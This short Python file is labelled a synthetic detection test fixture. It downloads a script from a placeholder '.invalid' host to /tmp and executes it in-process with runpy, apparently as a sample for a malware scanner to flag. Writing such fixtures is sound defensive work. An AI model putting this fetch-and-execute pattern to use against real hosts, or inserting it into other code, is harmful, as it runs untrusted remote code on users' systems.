# FIXTURE ONLY - synthetic detection test sample, not real malware
# A download is saved to a file and run in this process with runpy. Host is a .invalid domain.
import runpy
import urllib.request

urllib.request.urlretrieve("https://dl.example.invalid/s.py", "/tmp/_s.py")
runpy.run_path("/tmp/_s.py")
